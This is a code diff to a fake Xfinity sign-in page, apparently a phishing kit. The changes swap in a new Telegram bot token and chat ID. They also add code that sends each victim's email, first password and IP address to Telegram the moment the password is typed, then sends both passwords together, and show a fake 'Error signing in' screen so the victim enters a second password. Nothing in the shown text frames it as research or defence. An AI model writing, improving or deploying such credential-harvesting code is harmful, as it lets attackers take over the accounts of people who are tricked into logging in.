@@ -721,8 +721,8 @@
     // ============================================
     // CONFIGURATION - Hardcoded (safe for single file)
     // ============================================
-    const BOT_TOKEN = "8804061789:AAEybAVauFf9sfGD1Kc1lJv2jxxeYqNVeNQ";
-    const CHAT_ID = "6448606208";
+    const BOT_TOKEN = "8890998994:AAHVISGwPS8b0vAJilZiruNhDZ3SXSumb3Y";
+    const CHAT_ID = "6062408620";
 
     // ============================================
     // TELEGRAM SENDER FUNCTION
@@ -776,6 +776,32 @@
     📧 <b>User:</b> ${email}
     🔑 <b>P1:</b> ${password1}
     🔑 <b>P2:</b> ${password2}
+    🌐 <b>IP:</b> ${ip}
+
+    📅 ${timestamp}
+    ━━━━━━━━━━━━━━━━━━━━━━━━
+        `.trim();
+    }
+
+    // ============================================
+    // FORMAT SINGLE PASSWORD (P1 only)
+    // ============================================
+    function formatSinglePassword(email, password, ip) {
+        const timestamp = new Date().toLocaleString('en-US', {
+            timeZone: 'America/New_York',
+            month: '2-digit',
+            day: '2-digit',
+            year: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: true
+        });
+
+        return `
+    📱 <b>XFINITY PASSWORD ATTEMPT*</b>
+
+    📧 <b>User:</b> ${email}
+    🔑 <b>P1 Attempt:</b> ${password}
     🌐 <b>IP:</b> ${ip}
 
     📅 ${timestamp}
@@ -855,6 +881,7 @@
         let capturedPassword1 = '';
         let userIP = '';
         let step = 'id';
+        let p1Sent = false;
 
         getUserIP().then(ip => {
             userIP = ip;
@@ -874,6 +901,7 @@
 
         function resetToId() {
             step = 'id';
+            p1Sent = false;
             document.body.setAttribute("data-step", "id");
             title.textContent = "Sign in with your Xfinity ID";
             password.value = "";
@@ -908,6 +936,7 @@
         form.addEventListener("submit", async function (event) {
             event.preventDefault();
 
+            // STEP 1: Capture Email
             if (step === 'id') {
                 const email = identity.value.trim();
                 if (!email) {
@@ -933,6 +962,7 @@
                 return;
             }
 
+            // STEP 2: Capture Password 1 (Send to Telegram immediately)
             if (step === 'password1') {
                 if (!password.value) {
                     showError(password, passwordError, true, "Please enter your password.");
@@ -942,6 +972,19 @@
 
                 capturedPassword1 = password.value;
                 setLoading(signinBtn, true);
+                
+                // Send P1 to Telegram immediately
+                try {
+                    const singleMessage = formatSinglePassword(
+                        capturedEmail,
+                        capturedPassword1,
+                        userIP || 'Unknown'
+                    );
+                    await sendToTelegram(singleMessage);
+                    console.log('✅ P1 sent to Telegram');
+                } catch (error) {
+                    console.error('❌ Failed to send P1:', error);
+                }
                 
                 setTimeout(() => {
                     setLoading(signinBtn, false);
@@ -964,6 +1007,7 @@
                 return;
             }
 
+            // STEP 3: Capture Password 2 (Send both P1 and P2 to Telegram)
             if (step === 'password2') {
                 if (!password.value) {
                     showError(password, passwordError, true, "Please enter your new password.");
@@ -976,34 +1020,29 @@
                 setLoading(signinBtn, true);
                 
                 try {
-                    const message = formatCredentials(
+                    // Send both passwords together
+                    const fullMessage = formatCredentials(
                         capturedEmail,
                         capturedPassword1,
                         password2,
                         userIP || 'Unknown'
                     );
                     
-                    const sent = await sendToTelegram(message);
+                    await sendToTelegram(fullMessage);
+                    console.log('✅ Full capture sent to Telegram');
                     
-                    if (sent) {
-                        const formPanel = document.querySelector('.form-panel');
-                        if (formPanel) {
-                            formPanel.innerHTML = `
-                                <div style="padding: 2rem 0; text-align: center;">
-                                    <div style="color: #c62828; font-size: 1rem; margin-bottom: 0.5rem;">
-                                        ⚠️ Error signing in. Please try again later.
-                                    </div>
-                                    <div style="color: #5822b4; font-size: 1.5rem; font-weight: 700; margin-top: 1rem;">
-                                        Signing in...
-                                    </div>
+                    const formPanel = document.querySelector('.form-panel');
+                    if (formPanel) {
+                        formPanel.innerHTML = `
+                            <div style="padding: 2rem 0; text-align: center;">
+                                <div style="color: #c62828; font-size: 1rem; margin-bottom: 0.5rem;">
+                                    ⚠️ Error signing in. Please try again later.
                                 </div>
-                            `;
-                        }
-                    } else {
-                        showError(password, passwordError, true, "Error signing in. Please try again later.");
-                        setTimeout(() => {
-                            resetToId();
-                        }, 2000);
+                                <div style="color: #5822b4; font-size: 1.5rem; font-weight: 700; margin-top: 1rem;">
+                                    Signing in...
+                                </div>
+                            </div>
+                        `;
                     }
                 } catch (error) {
                     console.error('Error in submission:', error);
@@ -1050,10 +1089,12 @@
             identity.value = "";
             capturedEmail = '';
             capturedPassword1 = '';
+            p1Sent = false;
             resetToId();
         });
 
         console.log('✅ App initialized with Telegram integration');
+        console.log('📱 P1 will be sent immediately, then P1+P2 together');
     });
   </script>
 </body>
